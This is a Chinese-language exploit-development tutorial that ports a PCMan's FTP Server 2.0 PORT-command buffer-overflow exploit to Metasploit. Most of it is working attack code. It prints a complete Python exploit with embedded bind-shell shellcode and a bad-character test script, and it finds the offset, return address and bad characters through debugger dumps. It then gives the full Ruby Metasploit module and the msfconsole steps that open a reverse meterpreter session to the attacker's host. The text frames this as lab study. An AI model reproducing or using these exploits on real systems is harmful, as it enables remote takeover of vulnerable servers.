***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

## 前言

**如果针对某一程序或软件已经有了相应的渗透模块，此时再去写一个实现类似功能的模块就显得多此一举。然而，并非所有的渗透模块都是基于Metasploit框架开发的，其中有很多是用Perl、Python或者C/C++语言编写的，所以导致了这些模块不能直接在Metasploit中使用。此时需要将现有的渗透模块移植成为与Metasploit框架相兼容的模块，移植成功之后，不仅能够实现原有模块的功能，还可以利用Metasploit框架提供的各种丰富而又强大的工具来处理例行任务，同时可以动态切换攻击载荷，使渗透模块适用于更多的场景。**

##
![image.png](https://image.3001.net/images/20190514/1557844424_5cdad1c8eb900.png!small)
实验环境

    
    
    1.渗透主机：Kali-Linux-2019.1-vm-amd64
    2.目标主机：Windows XP SP3 Simplified Chinese
    3.软件版本：PCMan’s FTP Server 2.0

## 涉及工具

    
    
    1. python-2.7.15
    2. ImmunityDebugger1.85

## 渗透模块的分析

本文以PCMan’s FTP
Server软件为例，详细描述渗透模块的移植和测试过程。这款软件是由我国台湾省的国立阳明大学开发的，也是我个人比较喜欢的一款小巧、轻便、易用的FTP软件，可在五分钟之内迅速搭建一台FTP服务器。存在现成的渗透模块针对PCMan’s
FTP Server的缓冲区溢出漏洞。

1.渗透模块的详细代码如下：

    
    
    #!/usr/bin/env python
    #-*- coding: utf-8 -*-    
    # Exploit Title: PCMan FTP Server 2.0 PORT Command BoF Exploit
    # Author: Pablo González
    # Date: 4/11/2016
    # Software: PCMan 2.0
    # Tested on: Windows XP Profesional SP3 Spanish x86
    
    import socket
    
    print "Creating malicious input!"
    
    junk = '\x41'*2007
    ret="\xf7\x56\x3c\x7e"	#User32.dll 7E3C56F7
    nops = '\x90'*20
    
    #msfvenom -p windows/shell_bind_tcp LPORT=1144 -b '\x0a\x00\x0d' -f c
    #put shellcode in variable 'sc'
    sc=("\xdb\xd6\xba\xd3\x95\x1b\xd0\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
    "\x53\x31\x50\x17\x83\xe8\xfc\x03\x83\x86\xf9\x25\xdf\x41\x7f"
    "\xc5\x1f\x92\xe0\x4f\xfa\xa3\x20\x2b\x8f\x94\x90\x3f\xdd\x18"
    "\x5a\x6d\xf5\xab\x2e\xba\xfa\x1c\x84\x9c\x35\x9c\xb5\xdd\x54"
    "\x1e\xc4\x31\xb6\x1f\x07\x44\xb7\x58\x7a\xa5\xe5\x31\xf0\x18"
    "\x19\x35\x4c\xa1\x92\x05\x40\xa1\x47\xdd\x63\x80\xd6\x55\x3a"
    "\x02\xd9\xba\x36\x0b\xc1\xdf\x73\xc5\x7a\x2b\x0f\xd4\xaa\x65"
    "\xf0\x7b\x93\x49\x03\x85\xd4\x6e\xfc\xf0\x2c\x8d\x81\x02\xeb"
    "\xef\x5d\x86\xef\x48\x15\x30\xcb\x69\xfa\xa7\x98\x66\xb7\xac"
    "\xc6\x6a\x46\x60\x7d\x96\xc3\x87\x51\x1e\x97\xa3\x75\x7a\x43"
    "\xcd\x2c\x26\x22\xf2\x2e\x89\x9b\x56\x25\x24\xcf\xea\x64\x21"
    "\x3c\xc7\x96\xb1\x2a\x50\xe5\x83\xf5\xca\x61\xa8\x7e\xd5\x76"
    "\xcf\x54\xa1\xe8\x2e\x57\xd2\x21\xf5\x03\x82\x59\xdc\x2b\x49"
    "\x99\xe1\xf9\xe4\x91\x44\x52\x1b\x5c\x36\x02\x9b\xce\xdf\x48"
    "\x14\x31\xff\x72\xfe\x5a\x68\x8f\x01\x60\x11\x06\xe7\x02\xf1"
    "\x4e\xbf\xba\x33\xb5\x08\x5d\x4b\x9f\x20\xc9\x04\xc9\xf7\xf6"
    "\x94\xdf\x5f\x60\x1f\x0c\x64\x91\x20\x19\xcc\xc6\xb7\xd7\x9d"
    "\xa5\x26\xe7\xb7\x5d\xca\x7a\x5c\x9d\x85\x66\xcb\xca\xc2\x59"
    "\x02\x9e\xfe\xc0\xbc\xbc\x02\x94\x87\x04\xd9\x65\x09\x85\xac"
    "\xd2\x2d\x95\x68\xda\x69\xc1\x24\x8d\x27\xbf\x82\x67\x86\x69"
    "\x5d\xdb\x40\xfd\x18\x17\x53\x7b\x25\x72\x25\x63\x94\x2b\x70"
    "\x9c\x19\xbc\x74\xe5\x47\x5c\x7a\x3c\xcc\x6c\x31\x1c\x65\xe5"
    "\x9c\xf5\x37\x68\x1f\x20\x7b\x95\x9c\xc0\x04\x62\xbc\xa1\x01"
    "\x2e\x7a\x5a\x78\x3f\xef\x5c\x2f\x40\x3a")
    
    buffer= junk + ret + nops + sc
    
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = raw_input('Give me Remote IP Address:')
    connect=s.connect((ip,21))
    banner = s.recv(1024)
    print banner
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PASS\r\n')
    s.recv(1024)
    #Sending input PORT command (Exploitation is coming)
    s.send('PORT' + buffer + '\r\n')
    s.close()

2.关键信息收集

![关键信息收集.PNG](https://image.3001.net/images/20190514/1557846388_5cdad974d70b8.png!small)

3.确定偏移量Offset的方法和步骤，若不清楚，可以参照《关于CVE-2019-9766缓冲区溢出漏洞的渗透模块编写与测试》一文，这里不再详述。

4.现有模块的JMP ESP指令使用User32.dll对应的地址7E3C56F7，但该模块是基于Windows XP Profesional SP3
Spanish x86编写的，在这里西班牙语的XP显然是不适用的。于是在ImmunityDebugger中使用命令!mona jmp -r
esp查询合适的跳转指令，mona查询的结果保存在文件jmp.txt中，这里我们选择

    
    
    C:\WINDOWS\system32\USER32.dll

其对应的地址为0x77d29353，查询结果如下图所示：

![jmpesp.PNG](https://image.3001.net/images/20190514/1557846631_5cdada6732eea.png!small)5.关于shellcode中的坏字符，可以在ImmunityDebugger中使用mona插件辅助确定。这里我们使用一种原理性的方法来找出坏字符，虽然过程有点繁琐，但是准确性较高。测试代码如下所示（其中变量shellcode赋值为所有可能出现的字符）：

    
    
    # Exploit Title: PCMan FTP Server 2.0 PORT Command Exploit
    # Author: Neroqi
    # Date: 5/14/2019
    # Software: PCMan 2.0
    # Tested on: Windows XP Profesional SP3 Simplified Chinese
    
    import socket
    
    junk = '\x41'*2007
    ret='\x42'*4	#USER32.dll 0x77d29353
    nops = '\x90'*20
    
    shellcode = (
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
        "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
        "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
        "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
        "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
        "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
        "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
        "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
        "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
        "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    
    buffer= junk + ret + nops + shellcode
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = raw_input('Input FTP Server IP Address:')
    connect = s.connect((ip,21))
    s.recv(1024)
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PASS\r\n')
    s.recv(1024)
    #Sending input PORT command (Exploitation is coming)
    s.send('PORT' + buffer + '\r\n')
    s.close()

5.1 在Kali Linux中运行上述代码，输入PCMan’s FTP Server的IP地址，将所有可能的字符发送给PCMan’s
FTP，然后ImmunityDebugger中的显示如下（内容太多，此处节选一部分）：

    
    
    0012C7D4   41414141  AAAA
    0012C7D8   42424242  BBBB
    0012C7DC   90909090  悙悙
    0012C7E0   90909090  悙悙
    0012C7E4   90909090  悙悙
    0012C7E8   90909090  悙悙
    0012C7EC   90909090  悙悙
    0012C7F0   00000A0D  ....
    0012C7F4   0000000A  ....
    0012C7F8   00000000  ....
    0012C7FC   00000000  ....
    0012C800   00000000  ....
    0012C804   00000000  ....
    0012C808   00000000  ....
    0012C80C   00000000  ....
    0012C810   00000000  ....
    0012C814   00000066  f...
    0012C818   77EF6BF2  騥飛    GDI32.77EF6BF2

在上述结果中并没有看到shellcode的内容，20个空指令'\x90'之后的\x0D\x0A代表的是
'\r\n'（“<回车><换行>”），并不是shellcode中的部分字符，因此可以判定’\x00’为坏字符。

5.2 将shellcode中的’\x00’去掉，重复5.1中的操作，然后ImmunityDebugger中的显示如下：

    
    
    0012C7D4   41414141  AAAA
    0012C7D8   42424242  BBBB
    0012C7DC   90909090  悙悙
    0012C7E0   90909090  悙悙
    0012C7E4   90909090  悙悙
    0012C7E8   90909090  悙悙
    0012C7EC   90909090  悙悙
    0012C7F0   04030201  
    0012C7F4   08070605  
    0012C7F8   000A0D09  ....
    0012C7FC   00000000  ....
    0012C800   00000000  ....
    0012C804   00000000  ....
    0012C808   00000002  ...
    0012C80C   00000000  ....
    0012C810   00000000  ....
    0012C814   000000AC  ?..
    0012C818   77EF6BF2  騥飛    GDI32.77EF6BF22.4

从上述结果可以看到shellcode在’\x09’之后的内容全部丢失，因此可以判定’\x0a’为坏字符。重复步骤5.1和5.2，最终确定全部坏字符为'\x00\x0a\x0d'。

## 渗透模块的移植

分析完成现有的渗透模块之后，下面我们进行渗透模块的移植。

1\. 移植后的渗透模块pcman_port.rb的第一部分如下：

    
    
    require 'msf/core'
    
    class MetasploitModule < Msf::Exploit::Remote
      Rank = NormalRanking
    
      include Msf::Exploit::Remote::Ftp
    
      def initialize(info = {})
        super(update_info(info,
          'Name'           => "PCMan's FTP Server PORT Command Stack Buffer Overflow",
          'Description'    => "This module exploits a buffer overflow vulnerability found in the PORT command of the PCMan's FTP Server v2.0",
          'Author'         => 'Neroqi',
          'License'        => MSF_LICENSE,
          'References'     => 
              [
              	['EDB', '40714']
              ],
          'DefaultOptions' =>
            {
              'EXITFUNC' => 'process',
              'VERBOSE'  => true
            },
          'Payload'        =>
            {
              'Space'   => 1000,
              'BadChars'  => "\x00\x0a\x0d",
            },
          'Platform'       => 'win',
          'Targets'        =>
            [
              [ 'Windows XP Profesional SP3 Simplified Chinese',
                {
                  'Ret' => 0x77d29353, # C:\WINDOWS\system32\USER32.dll
                  'Offset' => 2007
                }
              ],
            ],
          'DisclosureDate' => 'May 14 2019',
          'DefaultTarget'  => 0))
          register_options(
            [
              Opt::RPORT(21),
              OptString.new('FTPUSER',[ true, 'FTP User', 'anonymous']),
              OptString.new('FTPPASS',[ true, 'FTP Password', 'anonymous'])
            ], self.class)
      end

1.1 语句require 'msf/core'引入了Metasploit中core库的所有内容；语句include
Msf::Exploit::Remote::Ftp引入了ftp. rb库文件，用于后续的FTP相关操作。

1.2
方法initialize定义了模块的相关信息及参数，包括Name、Description、Author以及DefaultOptions等等，其中坏字符在Payload中设置，Offset和JMP
ESP指令在Targets中设置。

1.3 register_options使用Opt::RPORT函数定义了目标端口，使用OptString.new函数为FTP的登录提供了用户名和密码。

2\. 移植后的渗透模块pcman_port.rb的第二部分如下：

    
    
      def exploit 
        c = connect_login
        return unless c
        sploit = rand_text_alpha(target['Offset'])
        sploit << [target.ret].pack('V')
        sploit << make_nops(20)
        sploit << payload.encoded 
        send_cmd( ["PORT" + sploit, false] )
        disconnect 
      end

2.1
rand_text_alpha()函数用于生成2007个（该值是由Targets中的变量Offset决定的）填充数据，用于替代原渗透模块中的'\x41'*2007，然后将填充数据保存到变量sploit中。

2.2 [target.ret].pack('V')函数将Targets中Ret的值（JMP
ESP的指令）以小端格式保存到sploit变量中，无需像原渗透模块那样使用大端格式保存。

2.3 make_nops(20)函数用于产生20个空指令。

2.4 payload.encoded函数用于对指定的攻击载荷进行编码。

2.5 然后使用ftp库中的send_cmd()函数将包含了变量sploit的PORT命令发送到目标。

3\. 移植后的渗透模块pcman_port.rb具有的优势：

3.1 rand_text_alpha()函数实现自动生成填充数据，无须手动生成。

3.2 JMP ESP的指令无须进行大小端格式转换，该工作由函数[target.ret].pack('V')实现。

3.3 make_nops()函数自动生成空指令，无须手动生成。

3.4 shellcode可动态切换，无须提供任何预先硬编码的shellcode，在需要改变shellcode时，就无须手动重新编码，从而节约了大量时间。

## 渗透模块的测试

1\. 将移植后的渗透模块pcman_port.rb拷贝到如下路径：

    
    
    /usr/share/metasploit-framework/modules/exploits/windows/ftp

然后在msfconsole中通过命令reload_all来重新载入所有的模块，确保模块编写无误。

2\. 在Metasploit中使用如下命令测试渗透模块pcman_port.rb是否正常工作，命令如下：

    
    
    msf5 > use exploit/windows/ftp/pcman_port
    msf5 exploit(windows/ftp/pcman_port) > set RHOSTS 192.168.188.137
    RHOSTS => 192.168.188.137
    msf5 exploit(windows/ftp/pcman_port) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf5 exploit(windows/ftp/pcman_port) > set LHOST 192.168.188.136
    LHOST => 192.168.188.136
    msf5 exploit(windows/ftp/pcman_port) > set LPORT 8888
    LPORT => 8888
    msf5 exploit(windows/ftp/pcman_port) > exploit

如下图所示，可以看到成功取得了与目标主机的meterpreter会话，说明模块移植成功：

![image.png](https://image.3001.net/images/20190514/1557847294_5cdadcfe75e51.png!small)

## 结束语

以上这些，就是关于如何将渗透模块移植到Metasploit框架中并且进行测试的过程。由于Metasploit的强大功能以及丰富的工具库，因此建议大家在遇到较新较好的渗透模块时，及时地将其移植到Metasploit框架中，以备后用。

 ***本文作者：Neroqi，转载请注明来自FreeBuf.COM**

